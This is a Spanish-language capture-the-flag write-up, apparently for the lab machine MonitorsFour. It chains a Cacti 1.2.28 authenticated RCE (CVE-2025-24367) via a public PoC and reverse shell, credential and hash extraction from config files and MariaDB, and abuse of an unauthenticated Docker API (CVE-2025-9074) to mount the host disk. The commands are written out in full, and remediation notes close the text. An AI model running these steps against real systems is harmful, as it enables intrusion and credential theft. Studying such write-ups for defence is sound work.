---
layout: single
classes: wide
title: "MonitorsFour - Writeup"
date: 2026-05-21
difficulty: Fácil
operating_system: Windows
service_hint: Cacti + CVE-2025-24367 + Docker API
tags:
  - CVE-2025-24367
  - CVE-2025-9074
  - Cacti
  - Docker API
  - RCE
  - Privilege Escalation
  - Fácil
summary: "Cadena de explotación: fuzzing de subdominios descubre Cacti 1.2.28, endpoint web filtra credenciales de usuario, y CVE-2025-24367 proporciona RCE autenticado como www-data. Desde el contenedor se abusa de la Docker API expuesta en la red interna para montar el filesystem del host y leer la flag de Administrador."
---

## Información general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Windows |
| Dificultad | Fácil |
| Tags | `CVE-2025-24367`, `CVE-2025-9074`, `Cacti`, `Docker API`, `RCE`, `Privilege Escalation` |
{: .info-table}

## Reconocimiento

Empezamos con un escaneo completo de puertos para descubrir los servicios expuestos en la máquina Windows. Queríamos identificar todos los puntos de entrada disponibles antes de profundizar.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.129.1.174 -oG allPorts
```

Con los puertos identificados, hicimos un escaneo más detallado con scripts de servicio para obtener versiones, banners y confirmar los fingerprints.

```bash
nmap -p80,5985 -sCV 10.129.1.174 -oN targeted
```

Los indicadores clave de esta fase fueron:

- `80/tcp` expone **nginx** con PHP 8.3.27 y redirige a `monitorsfour.htb`.
- `5985/tcp` confirma WinRM accesible, útil para acceso posterior con credenciales válidas.

## Enumeración

Una vez agregado el dominio al `/etc/hosts`, identificamos las tecnologías del sitio con WhatWeb para saber con qué frameworks y servidores estamos tratando antes de profundizar en la enumeración.

```bash
whatweb http://monitorsfour.htb/
```

Fuzzeamos directorios con feroxbuster para descubrir rutas ocultas dentro de la aplicación web que no son accesibles desde la navegación normal.

```bash
feroxbuster -u http://monitorsfour.htb -t 50
```

Buscamos subdominios adicionales con wfuzz, que fue clave para encontrar el panel de Cacti escondido y el resto de servicios virtuales del dominio.

```bash
wfuzz -H "Host: FUZZ.monitorsfour.htb" --hc 404,403 -c --hh 138 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://monitorsfour.htb
```

El hallazgo crítico fue el subdominio `cacti.monitorsfour.htb`, que expone una instalación de **Cacti versión 1.2.28**.

## Metodología de análisis del vector inicial

El vector de entrada se priorizó en el subdominio `cacti.monitorsfour.htb` porque la versión 1.2.28 de Cacti tiene vulnerabilidades RCE autenticadas conocidas. El endpoint `/user?token=0` encontrado en el sitio principal filtraba información de usuarios sin autenticación, proporcionando nombres de cuenta potenciales para acceder a Cacti.

La presencia de un dump SQL accesible públicamente en la instalación de Cacti permitió obtener hashes de contraseña, y la funcionalidad de subida de plantillas en Cacti proporcionaba el vector para convertir acceso autenticado en ejecución remota de código.

## Investigación de vulnerabilidades

Dos CVEs documentadas guiaron la fase de investigación:

- **CVE-2025-24367**: Vulnerabilidad de RCE autenticada en Cacti que permite a un usuario con acceso al panel subir una plantilla maliciosa que ejecuta código PHP en el servidor, proporcionando una shell en el contenedor web.
- **CVE-2025-9074**: Vulnerabilidad crítica (CVSS 9.3) en Docker Desktop que expone la Docker API sin autenticación en la subred interna `192.168.65.0/24`, permitiendo a cualquier contenedor Linux crear contenedores privilegiados con montajes del sistema de archivos del host.

![Panel de login de Cacti 1.2.28](/images/writeups/monitorsfour/Pasted image 20260521120236.png)

Descargamos el dump SQL de Cacti que está accesible públicamente desde la instalación. Los dumps de instalación suelen contener credenciales por defecto que podemos aprovechar si no fueron cambiadas.

```bash
curl -s http://cacti.monitorsfour.htb/cacti/cacti.sql -o cacti.sql
```

Buscamos en el dump las sentencias INSERT INTO user para encontrar los usuarios y sus hashes de contraseña. Así identificamos las cuentas predefinidas de Cacti.

```bash
grep -i "INSERT INTO user" -n cacti.sql
```

Encontramos el hash MD5 del usuario `admin` (`21232f297a57a5a743894a0e4a801fc3`) que corresponde a `admin`, pero la contraseña ya había sido cambiada en el sistema activo.

## Explotación

Durante la enumeración web descubrimos un endpoint `/user?token=0` que filtra información de usuarios sin necesidad de autenticación. Consultamos el listado completo de usuarios para obtener nombres y roles.

```bash
curl http://monitorsfour.htb/user?token=0
```

El endpoint devolvió los siguientes usuarios:

| Username | Rol | Nombre |
|----------|-----|--------|
| `admin` | super user | Marcus Higgins |
| `mwatson` | user | Michael Watson |
| `janderson` | user | Jennifer Anderson |
| `dthompson` | user | David Thompson |

El nombre real de `admin` era **Marcus Higgins**, lo que sugería que el usuario local `marcus` podía existir en el sistema. Probamos credenciales contra Cacti y el usuario `marcus` con contraseña `[REDACTED]` funcionó.

Cacti 1.2.28 tiene una vulnerabilidad RCE autenticada conocida como CVE-2025-24367. Clonamos un PoC público para explotarla y obtener acceso al contenedor.

```bash
git clone https://github.com/SoftAndoWetto/CVE-2025-24367-PoC-Cacti.git
```

Con las credenciales de marcus apuntando a nuestra IP, ejecutamos el exploit para que suba un payload PHP mediante manipulación de plantillas y nos devuelva una shell reversa desde el contenedor Cacti.

```bash
python3 exploit.py
```

Abrimos un listener en el puerto 4444 para recibir la shell reversa que el exploit va a disparar desde el contenedor Cacti.

```bash
nc -nlvp 4444
```

```bash
connect to [10.10.14.150] from (UNKNOWN) [10.129.2.62] 65007
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$
```

Una vez dentro del contenedor, buscamos credenciales en los archivos de configuración clave. Primero revisamos el `.env` de la aplicación, que suele contener credenciales de base de datos y otros secretos.

```bash
www-data@821fbd6a43fa:~/html/cacti$ cat /var/www/app/.env
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=[REDACTED]
```

Seguimos con el archivo de configuración principal de Cacti. Primero filtramos por "user" para localizar las líneas de credenciales de la base de datos.

```bash
www-data@821fbd6a43fa:~/html/cacti$ cat /var/www/html/cacti/include/config.php | grep user
```

También revisamos los archivos de configuración de Cacti para encontrar las credenciales de su propia base de datos MySQL. Con la contraseña obtenida nos conectamos a MariaDB para explorar las tablas internas del sistema.

```bash
www-data@821fbd6a43fa:~/html/cacti$ grep -Ei "user|pass|host|database|db_|mysql|mysqli|port" /var/www/html/cacti/include/config.php
```

```bash
www-data@821fbd6a43fa:~/html/cacti$ mysql -h mariadb -u cactidbuser -p
Enter password:
```

```sql
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| cacti              |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> USE cacti;

MariaDB [cacti]> SELECT id,username,password FROM user_auth;
+----+----------+--------------------------------------------------------------+
| id | username | password                                                     |
+----+----------+--------------------------------------------------------------+
|  1 | admin    | $2y$10$wqlo06C4isr4q9xhqI/UQOpyM/n8EDzYl/GndqhDh/2LQihzPdHWO |
|  3 | guest    | 43e9a4ab75570f5b                                             |
|  4 | marcus   | $2y$10$bPWlnZYLhoDUawu4x8vLAuCIaDbqIUe4s9t9HqFm/1gtbavD/eKGe |
+----+----------+--------------------------------------------------------------+
```

## Escalada de privilegios

Desde el contenedor no tenemos acceso directo al host Windows, pero podemos explorar la red interna de Docker. Creamos un script que escanea la subred 192.168.65.0/24 buscando la Docker API expuesta sin autenticación en el puerto 2375.

```bash
www-data@821fbd6a43fa:/tmp$ cat << 'EOF' > scan.sh
for i in $(seq 1 254); do
  ip="192.168.65.$i"
  timeout 1 bash -c "
    curl -s http://$ip:2375/version | grep -q 'ApiVersion'
  " 2>/dev/null && echo "[+] Docker API OPEN: $ip:2375"
done
EOF
```

Damos permisos de ejecución al script y lo lanzamos. Escanea toda la subred y encuentra la Docker API abierta sin autenticación en 192.168.65.7:2375.

```bash
www-data@821fbd6a43fa:/tmp$ chmod +x scan.sh
www-data@821fbd6a43fa:/tmp$ ./scan.sh
[+] Docker API OPEN: 192.168.65.7:2375
```

El host `192.168.65.7:2375` tiene la Docker API expuesta sin autenticación. Esta exposición se debe al **CVE-2025-9074**, una vulnerabilidad crítica (CVSS 9.3) en Docker Desktop que permite a cualquier contenedor Linux acceder al motor Docker a través de la subred interna `192.168.65.0/24` sin necesidad de montar el socket de Docker, posibilitando la creación de contenedores privilegiados que montan el sistema de archivos del host. Listamos las imágenes disponibles en el motor Docker para identificar qué contenedores existen y cuál podemos usar como base para montar el sistema de archivos del host.

```bash
www-data@821fbd6a43fa:/tmp$ curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
"RepoTags":["docker_setup-nginx-php:latest"]
"RepoTags":["docker_setup-mariadb:latest"]
"RepoTags":["alpine:latest"]
```

Preparamos un payload JSON que define un contenedor Alpine con el sistema de archivos del host montado en `/mnt/host_root`. El comando del contenedor lee directamente la flag de Administrador desde el disco montado.

```bash
www-data@821fbd6a43fa:/tmp$ nano payload.json
```

```json
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
```

Levantamos un servidor HTTP en nuestra máquina atacante para que el contenedor víctima pueda descargar el payload JSON.

```bash
python3 -m http.server 8000
```

Desde el contenedor víctima, descargamos el payload JSON usando curl apuntando a nuestro servidor HTTP atacante.

```bash
www-data@821fbd6a43fa:/tmp$ curl http://10.10.14.150:8000/payload.json -o /tmp/payload.json
```

Enviamos el payload JSON a la Docker API para crear un contenedor Alpine que monte el disco del host. La API nos devuelve el ID del contenedor creado, lo que confirma que el motor aceptó la solicitud.

```bash
www-data@821fbd6a43fa:/tmp$ curl -X POST -H "Content-Type: application/json" -d @/tmp/payload.json http://192.168.65.7:2375/containers/create?name=pwned
{"Id":"20dd4fc655bd666d5207249c937cbe951107cdd5b68b7f89e67feafe354731d4","Warnings":[]}
```

Iniciamos el contenedor con el endpoint `/start`. Al arrancar, ejecuta el comando que definimos en el payload: montar el disco del host y leer la flag de root.

```bash
www-data@821fbd6a43fa:/tmp$ curl -X POST http://192.168.65.7:2375/containers/20dd4fc655bd/start
```

Consultamos los logs del contenedor con el endpoint `/logs`. La salida contiene la flag de root que el contenedor extrajo del sistema de archivos del host montado.

```bash
www-data@821fbd6a43fa:/tmp$ curl http://192.168.65.7:2375/containers/20dd4fc655bd/logs?stdout=true
[REDACTED]
```

**Flag de root:** `[REDACTED]`

## Cadena de explotación

```text
Fuzzing de subdominios
-> cacti.monitorsfour.htb (Cacti 1.2.28)
-> endpoint /user?token=0 filtra usuarios
-> credenciales de marcus
-> CVE-2025-24367 (RCE autenticado en Cacti)
-> shell como www-data en contenedor
-> escaneo de subred interna 192.168.65.0/24
-> Docker API expuesta en 192.168.65.7:2375 (CVE-2025-9074)
-> contenedor Alpine con montaje del host
-> lectura de root.txt desde disco del host
```

## Flags

| Flag | Valor |
|------|-------|
| `user.txt` | `[REDACTED]` |
| `root.txt` | `[REDACTED]` |

## Lecciones técnicas

1. Un endpoint sin autenticación que filtra usuarios puede proporcionar los nombres de cuenta necesarios para ataques de fuerza bruta o reutilización de credenciales en servicios internos.
2. Los dumps SQL de instalación nunca deben ser accesibles públicamente, ya que contienen hashes y configuraciones por defecto.
3. La Docker API expuesta sin autenticación en una subred interna equivale a compromiso total del host, ya que cualquier contenedor puede montar el sistema de archivos completo.
4. Las aplicaciones legacy como Cacti deben actualizarse o aislarse en redes separadas, especialmente cuando manejan credenciales de base de datos.

## Conclusión

MonitorsFour resultó ser una máquina de dificultad **Fácil** que combinó dos vectores: la explotación de Cacti 1.2.28 mediante **CVE-2025-24367** para obtener acceso a un contenedor web, y el abuso de una **Docker API expuesta sin autenticación** en la red interna para montar el sistema de archivos del host y leer la flag de Administrador. La lección principal es que exponer un panel de Cacti en una versión vulnerable combinado con una API de Docker abierta convierte una intrusión web limitada en compromiso total del sistema.

## Remediación

1. Actualizar Cacti a una versión que parchee CVE-2025-24367 o migrar a una alternativa más segura.
2. Eliminar el endpoint `/user?token=0` o requerir autenticación para acceder a información de usuarios.
3. No exponer dumps SQL de instalación en el directorio web público.
4. Configurar la Docker API para requerir autenticación TLS y no exponerla en subredes accesibles desde contenedores no privilegiados.
5. Aplicar el parche de seguridad correspondiente a CVE-2025-9074 en Docker Desktop.
